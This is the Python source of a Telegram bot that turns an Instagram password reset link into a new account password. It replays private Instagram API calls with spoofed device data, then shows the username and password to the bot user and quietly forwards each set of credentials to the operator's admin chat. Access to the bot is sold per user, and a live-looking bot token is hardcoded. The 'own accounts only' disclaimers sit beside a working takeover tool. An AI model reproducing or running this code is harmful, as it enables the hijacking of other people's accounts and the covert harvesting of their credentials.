import os
import random
import string
import uuid
from datetime import datetime
import requests
from hashlib import md5
import base64
import secrets
from bs4 import BeautifulSoup
import json
import time
from threading import Thread

# Try to import required modules, install if missing
try:
    import requests
    import pyfiglet
    from rich.console import Console
    from cfonts import render
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
except ImportError:
    os.system("pip install requests pyfiglet rich cfonts python-telegram-bot")
    import requests
    import pyfiglet
    from rich.console import Console
    from cfonts import render
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Colors for console (optional)
b = random.randint(5,208)
bo = f'\x1b[38;5;{b}m'
ED = '\x1b[38;5;208m'
BLUE = '\033[94m'
Z = '\033[1;31m' 
YELLOW = '\033[1;33m' 
J = '\033[2;36m'
N = '\033[1;37m'

# Bot configuration
BOT_TOKEN = "8603510237:AAFni5_cboiPIuZIR2RD6mm9RU5vsrRlCZA"  # Replace with your bot token
ADMIN_ID = "6592441427"  # Replace with your Telegram ID

# Authorized users and groups
# Format: {"chat_id": {"access_level": "admin/user", "expiry": timestamp}}
AUTHORIZED_USERS = {
    ADMIN_ID: {"access_level": "admin", "expiry": None}  # Admin has permanent access
}

# Store user states
user_states = {}

def generate_device_info():
    ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
    USER_AGENT = f"Instagram 394.0.0.46.81 Android ({random.choice(['28/9','29/10','30/11','31/12'])}; {random.choice(['240dpi','320dpi','480dpi'])}; {random.choice(['720x1280','1080x1920','1440x2560'])}; {random.choice(['samsung','xiaomi','huawei','oneplus','google'])}; {random.choice(['SM-G975F','Mi-9T','P30-Pro','ONEPLUS-A6003','Pixel-4'])}; intel; en_US; {random.randint(100000000,999999999)})"
    WATERFALL_ID = str(uuid.uuid4())
    timestamp = int(datetime.now().timestamp())
    nums = ''.join([str(random.randint(1, 100)) for _ in range(4)])
    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:Random@{nums}'
    return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD

def make_headers(mid="", user_agent=""):
    return {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
        "X-Mid": mid,
        "User-Agent": user_agent,
        "Content-Length": "9481"
    }

def id_user(user_id):
    try:
        url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
        headers = {
            "User-Agent": "Instagram 219.0.0.12.117 Android"
        }
        r = requests.get(url, headers=headers)
        try:
            username = r.json()["user"]["username"]
            return username
        except:
            return "Unknown"
    except:
        return "Unknown"

def reset_instagram_password(reset_link):
    try:
        ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info()
        
        # Extract parameters from reset link
        try:
            uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
            token = reset_link.split("&token=")[1].split(":")[0]
        except:
            # Alternative parsing method
            parts = reset_link.split("/")
            for part in parts:
                if "uidb36" in part:
                    uidb36 = part.split("=")[1]
                if "token" in part:
                    token = part.split("=")[1]
        
        url = "https://i.instagram.com/api/v1/accounts/password_reset/"
        data = {
            "source": "one_click_login_email",
            "uidb36": uidb36,
            "device_id": ANDROID_ID,
            "token": token,
            "waterfall_id": WATERFALL_ID
        }
        
        r = requests.post(url, headers=make_headers(user_agent=USER_AGENT), data=data)
        
        if "user_id" not in r.text:
            return {"success": False, "error": "Invalid reset link or expired"}

        mid = r.headers.get("Ig-Set-X-Mid")
        resp_json = r.json()
        user_id = resp_json.get("user_id")
        cni = resp_json.get("cni")
        nonce_code = resp_json.get("nonce_code")
        challenge_context = resp_json.get("challenge_context")

        url2 = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
        data2 = {
            "user_id": str(user_id),
            "cni": str(cni),
            "nonce_code": str(nonce_code),
            "bk_client_context": '{"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"}',
            "challenge_context": str(challenge_context),
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "get_challenge": "true"
        }
        
        r2 = requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data2).text
        
        # Parse challenge context
        try:
            challenge_context_final = r2.replace('\\', '').split(f'(bk.action.i64.Const, {cni}), "')[1].split('", (bk.action.bool.Const, false)))')[0]
        except:
            return {"success": False, "error": "Failed to get challenge context"}

        data3 = {
            "is_caa": "False",
            "source": "",
            "uidb36": "",
            "error_state": {"type_name":"str","index":0,"state_id":1048583541},
            "afv": "",
            "cni": str(cni),
            "token": "",
            "has_follow_up_screens": "0",
            "bk_client_context": {"bloks_version":"e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd","styles_id":"instagram"},
            "challenge_context": challenge_context_final,
            "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
            "enc_new_password1": PASSWORD,
            "enc_new_password2": PASSWORD
        }
        
        requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data3)
        new_password = PASSWORD.split(":")[-1]
        
        return {
            "success": True,
            "password": new_password,
            "user_id": user_id
        }
        
    except Exception as e:
        return {"success": False, "error": str(e)}

# Access Control Functions
def check_access(user_id, chat_id=None):
    """Check if user has access to use the bot"""
    user_id_str = str(user_id)
    chat_id_str = str(chat_id) if chat_id else None
    
    # Check if user is authorized
    if user_id_str in AUTHORIZED_USERS:
        user_data = AUTHORIZED_USERS[user_id_str]
        # Check if access expired
        if user_data["expiry"] and time.time() > user_data["expiry"]:
            return False, "Your access has expired"
        return True, user_data["access_level"]
    
    # Check if chat is authorized (for groups)
    if chat_id_str and chat_id_str in AUTHORIZED_USERS:
        user_data = AUTHORIZED_USERS[chat_id_str]
        # Check if access expired
        if user_data["expiry"] and time.time() > user_data["expiry"]:
            return False, "Group access has expired"
        return True, user_data["access_level"]
    
    return False, "You are not authorized to use this bot"

def add_access(target_id, access_level="user", expiry_days=None):
    """Add user or group access"""
    target_id_str = str(target_id)
    expiry = None
    if expiry_days:
        expiry = time.time() + (expiry_days * 27 * 60 * 60)
    
    AUTHORIZED_USERS[target_id_str] = {
        "access_level": access_level,
        "expiry": expiry
    }
    return True

def remove_access(target_id):
    """Remove user or group access"""
    target_id_str = str(target_id)
    if target_id_str in AUTHORIZED_USERS:
        del AUTHORIZED_USERS[target_id_str]
        return True
    return False

# Telegram Bot Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    user_id = user.id
    chat_id = chat.id
    
    # Handle callback query
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        message = query.message
    else:
        message = update.message
    
    # Check access
    has_access, access_level = check_access(user_id, chat_id)
    
    if not has_access:
        await message.reply_text(
            "❌ *Access Denied*\n\n"
            "You are not authorized to use this bot.\n"
            "Please contact the administrator for access.\n\n"
            f"Admin: @NAGIPY",
            parse_mode='Markdown'
        )
        return
    
    welcome_msg = f"""
🔐 *Instagram Password Reset Bot* 🔐

Welcome {user.first_name}!

*Your Access Level:* `{access_level.upper()}`

This bot helps you reset Instagram passwords using reset links.

*Commands:*
/reset - Start password reset process
/help - Show this help message

*How to use:*
1. Send /reset command
2. Send me the Instagram password reset link
3. Wait for the result

⚠️ *Note:* Use responsibly and only on your own accounts!
"""
    
    keyboard = [
        [InlineKeyboardButton("🔄 Start Reset", callback_data="reset")],  # Changed to lowercase "reset"
        [InlineKeyboardButton("❓ Help", callback_data="help")],  # Changed to lowercase "help"
        [InlineKeyboardButton("📢 Channel", url="https://t.me/Pyunivers")]
    ]
    
    # Add admin buttons if user is admin
    if access_level == "admin":
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin")])  # Changed to "admin"
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Handle both callback query and regular message
    if update.callback_query:
        await message.edit_text(welcome_msg, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await message.reply_text(welcome_msg, reply_markup=reply_markup, parse_mode='Markdown')

async def access_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    chat = update.effective_chat
    user_id = user.id
    chat_id = chat.id
    
    has_access, access_level = check_access(user_id, chat_id)
    
    if has_access:
        user_data = AUTHORIZED_USERS.get(str(user_id)) or AUTHORIZED_USERS.get(str(chat_id))
        expiry = user_data.get("expiry")
        expiry_text = "Never" if not expiry else datetime.fromtimestamp(expiry).strftime("%Y-%m-%d %H:%M:%S")
        
        access_msg = f"""
✅ *Access Information*

*User:* {user.first_name}
*User ID:* `{user_id}`
*Chat ID:* `{chat_id}`
*Access Level:* `{access_level.upper()}`
*Expires:* {expiry_text}

*Authorized Users/Groups:*
"""
        # List some authorized users
        for aid, data in list(AUTHORIZED_USERS.items())[:5]:
            expiry = data.get("expiry")
            expiry_str = "Never" if not expiry else datetime.fromtimestamp(expiry).strftime("%Y-%m-%d")
            access_msg += f"\n`{aid}` - {data['access_level']} (Exp: {expiry_str})"
        
        await update.message.reply_text(access_msg, parse_mode='Markdown')
    else:
        await update.message.reply_text(
            "❌ You don't have access to this bot.\n"
            "Contact @NAGIPY for access."
        )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    # Handle callback query
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        message = query.message
    else:
        message = update.message
    
    has_access, access_level = check_access(user_id, chat_id)
    
    if not has_access:
        await message.reply_text("❌ Access Denied")
        return
    
    help_text = """
*📚 Help & Instructions*

*What is this bot?*
This bot processes Instagram password reset links to generate new passwords.

*How to get a reset link:*
1. Go to Instagram login page
2. Click "Forgot password"
3. Enter username/email/phone
4. Check your email for reset link
5. Copy the entire link

*Valid link format:*
https://instagram.com/accounts/password/reset/...

*Commands:*
/reset - Start password reset
/cancel - Cancel current operation
/help - Show this message
/about - About the bot

*⚠️ Disclaimer:*
Use this tool only for recovering your own accounts. Misuse may violate Instagram's terms of service.
"""
    
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await message.edit_text(help_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await message.reply_text(help_text, reply_markup=reply_markup, parse_mode='Markdown')

async def about_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    has_access, access_level = check_access(user_id, chat_id)
    
    if not has_access:
        await update.message.reply_text("❌ Access Denied")
        return
    
    about_text = """
*🤖 About This Bot*

*Version:* 1.0
*Creator:* @NAGIPY
*Channel:* @PyUnivers

*Features:*
• Instagram password reset processing
• Automatic password generation
• Access control system
• Admin panel for management
• Secure handling

*Note:* This bot is for educational purposes only.
Use at your own risk and responsibility.

*Support:* @NAGIPY
"""
    keyboard = [
        [InlineKeyboardButton("📢 Channel", url="https://t.me/xPythonTool")],
        [InlineKeyboardButton("👤 Developer", url="https://t.me/xYourKing")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(about_text, reply_markup=reply_markup, parse_mode='Markdown')

async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    # Handle callback query
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        message = query.message
    else:
        message = update.message
    
    has_access, access_level = check_access(user_id, chat_id)
    
    if not has_access:
        await message.reply_text("❌ Access Denied")
        return
    
    user_states[user_id] = {"state": "awaiting_link"}
    
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await message.reply_text(
        "📎 *Please send me the Instagram password reset link*\n\n"
        "Example: `https://instagram.com/accounts/password/reset/?uidb36=...&token=...`\n\n"
        "Send /cancel to abort.",
        parse_mode='Markdown',
        reply_markup=reply_markup
    )

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    # Handle callback query
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        message = query.message
    else:
        message = update.message
    
    if user_id in user_states:
        del user_states[user_id]
    
    await message.reply_text("❌ Operation cancelled.")
    
    # Return to start menu
    await start(update, context)

# Admin Commands
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    # Handle callback query
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        message = query.message
    else:
        message = update.message
    
    has_access, access_level = check_access(user_id, chat_id)
    
    if access_level != "admin":
        await message.reply_text("❌ This command is for admins only!")
        return
    
    admin_text = """
*👑 Admin Panel*

*Commands:*
/adduser [user_id] [days] - Add user access
/addgroup [chat_id] [days] - Add group access
/remove [user_id] - Remove access
/listusers - List authorized users
/broadcast [message] - Send message to all users

*Examples:*
/adduser 123456789 30
/addgroup -100123456789 7
/remove 123456789
"""
    
    keyboard = [
        [InlineKeyboardButton("📋 List Users", callback_data="list_users")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_to_start")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await message.edit_text(admin_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await message.reply_text(admin_text, reply_markup=reply_markup, parse_mode='Markdown')

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    has_access, access_level = check_access(user_id, None)
    
    if access_level != "admin":
        await update.message.reply_text("❌ Admin only command!")
        return
    
    try:
        args = context.args
        if len(args) < 1:
            await update.message.reply_text("Usage: /adduser [user_id] [days]")
            return
        
        target_id = args[0]
        days = int(args[1]) if len(args) > 1 else None
        
        add_access(target_id, "user", days)
        
        await update.message.reply_text(
            f"✅ Added user `{target_id}` with access for {days if days else 'unlimited'} days",
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def add_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    has_access, access_level = check_access(user_id, None)
    
    if access_level != "admin":
        await update.message.reply_text("❌ Admin only command!")
        return
    
    try:
        args = context.args
        if len(args) < 1:
            await update.message.reply_text("Usage: /addgroup [chat_id] [days]")
            return
        
        target_id = args[0]
        days = int(args[1]) if len(args) > 1 else None
        
        add_access(target_id, "user", days)
        
        await update.message.reply_text(
            f"✅ Added group `{target_id}` with access for {days if days else 'unlimited'} days",
            parse_mode='Markdown'
        )
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def remove_access_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    has_access, access_level = check_access(user_id, None)
    
    if access_level != "admin":
        await update.message.reply_text("❌ Admin only command!")
        return
    
    try:
        args = context.args
        if len(args) < 1:
            await update.message.reply_text("Usage: /remove [user_id]")
            return
        
        target_id = args[0]
        
        if remove_access(target_id):
            await update.message.reply_text(f"✅ Removed access for `{target_id}`", parse_mode='Markdown')
        else:
            await update.message.reply_text(f"❌ User `{target_id}` not found", parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Handle callback query
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        message = query.message
    else:
        message = update.message
    
    has_access, access_level = check_access(user_id, None)
    
    if access_level != "admin":
        await message.reply_text("❌ Admin only command!")
        return
    
    if not AUTHORIZED_USERS:
        await message.reply_text("No authorized users")
        return
    
    msg = "*📋 Authorized Users/Groups:*\n\n"
    for uid, data in AUTHORIZED_USERS.items():
        expiry = data.get("expiry")
        expiry_str = "Never" if not expiry else datetime.fromtimestamp(expiry).strftime("%Y-%m-%d %H:%M")
        msg += f"`{uid}` - {data['access_level']}\nExpires: {expiry_str}\n\n"
    
    # Split message if too long
    if len(msg) > 4000:
        msg = msg[:4000] + "...\n(truncated)"
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Admin", callback_data="admin")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await message.edit_text(msg, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await message.reply_text(msg, reply_markup=reply_markup, parse_mode='Markdown')

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    has_access, access_level = check_access(user_id, None)
    
    if access_level != "admin":
        await update.message.reply_text("❌ Admin only command!")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /broadcast [message]")
        return
    
    message = " ".join(context.args)
    
    sent = 0
    failed = 0
    
    status_msg = await update.message.reply_text("📢 Broadcasting message...")
    
    for uid in AUTHORIZED_USERS.keys():
        try:
            await context.bot.send_message(
                chat_id=int(uid),
                text=f"*📢 Broadcast Message:*\n\n{message}",
                parse_mode='Markdown'
            )
            sent += 1
            time.sleep(0.05)  # Small delay to avoid rate limiting
        except:
            failed += 1
    
    await status_msg.edit_text(
        f"✅ Broadcast completed!\n"
        f"Sent: {sent}\n"
        f"Failed: {failed}"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    message_text = update.message.text
    
    # Check access
    has_access, access_level = check_access(user_id, chat_id)
    
    if not has_access:
        await update.message.reply_text(
            "❌ You are not authorized to use this bot.\n"
            "Contact @NAGIPY for access."
        )
        return
    
    # Check if user is in a state
    if user_id not in user_states:
        await update.message.reply_text(
            "Please use /reset command first to start the process."
        )
        return
    
    state = user_states[user_id].get("state")
    
    if state == "awaiting_link":
        # Process the reset link
        if "instagram.com" not in message_text or "reset" not in message_text.lower():
            await update.message.reply_text(
                "❌ *Invalid link!*\n\n"
                "Please send a valid Instagram password reset link.\n"
                "Example: `https://instagram.com/accounts/password/reset/...`\n\n"
                "Send /cancel to abort.",
                parse_mode='Markdown'
            )
            return
        
        # Send processing message
        processing_msg = await update.message.reply_text(
            "⏳ *Processing your request...*\n"
            "This may take a few moments.",
            parse_mode='Markdown'
        )
        
        # Process the reset link
        result = reset_instagram_password(message_text)
        
        if result.get("success"):
            user_id_insta = result.get("user_id")
            new_password = result.get("password")
            username = id_user(user_id_insta)
            
            # Format success message
            success_msg = f"""
✅ *PASSWORD RESET SUCCESSFUL* ✅

━━━━━━━━━━━━━━━━━━━
📱 *Instagram Account*
━━━━━━━━━━━━━━━━━━━
👤 *Username:* `{username}`
🔑 *New Password:* `{new_password}`
🆔 *User ID:* `{user_id_insta}`
━━━━━━━━━━━━━━━━━━━

⚠️ *Important:*
• Save this password immediately
• Login with the new credentials
• Change password after login if needed

━━━━━━━━━━━━━━━━━━━
🤖 Bot by @NAGIPY
📢 Channel: @PyUnivers
"""
            
            await processing_msg.edit_text(success_msg, parse_mode='Markdown')
            
            # Send copy to admin
            try:
                admin_msg = f"New reset by @{update.effective_user.username or 'Unknown'} (ID: {user_id})\nUsername: {username}\nPassword: {new_password}"
                await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
            except:
                pass
            
        else:
            error_msg = f"""
❌ *RESET FAILED* ❌

━━━━━━━━━━━━━━━━━━━
*Error:* {result.get('error', 'Unknown error occurred')}

*Possible reasons:*
• Invalid or expired link
• Link already used
• Instagram blocking request
• Network issues

━━━━━━━━━━━━━━━━━━━
Please try again with a valid reset link.
Send /reset to start over.
"""
            await processing_msg.edit_text(error_msg, parse_mode='Markdown')
        
        # Clear user state
        del user_states[user_id]

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    
    await query.answer()
    
    # Check access
    has_access, access_level = check_access(user_id, chat_id)
    
    if not has_access:
        await query.message.reply_text("❌ Access Denied")
        return
    
    # Handle different callback data
    if query.data == "reset":
        # Create a new update object for reset command
        await reset_command(update, context)
    elif query.data == "help":
        # Create a new update object for help command
        await help_command(update, context)
    elif query.data == "admin":
        if access_level == "admin":
            await admin_command(update, context)
        else:
            await query.message.reply_text("❌ Admin only!")
    elif query.data == "list_users":
        if access_level == "admin":
            await list_users(update, context)
        else:
            await query.message.reply_text("❌ Admin only!")
    elif query.data == "back_to_start":
        await start(update, context)
    elif query.data == "cancel":
        await cancel_command(update, context)

def main():
    print("🤖 Starting Instagram Password Reset Bot...")
    print(f"Bot Token: {BOT_TOKEN[:10]}...")
    print(f"Admin ID: {ADMIN_ID}")
    print(f"Authorized Users: {len(AUTHORIZED_USERS)}")
    print("Bot is running. Press Ctrl+C to stop.")
    
    # Create the Application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("about", about_command))
    application.add_handler(CommandHandler("reset", reset_command))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(CommandHandler("access", access_command))
    
    # Admin commands
    application.add_handler(CommandHandler("admin", admin_command))
    application.add_handler(CommandHandler("adduser", add_user))
    application.add_handler(CommandHandler("addgroup", add_group))
    application.add_handler(CommandHandler("remove", remove_access_command))
    application.add_handler(CommandHandler("listusers", list_users))
    application.add_handler(CommandHandler("broadcast", broadcast))
    
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Start the bot
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
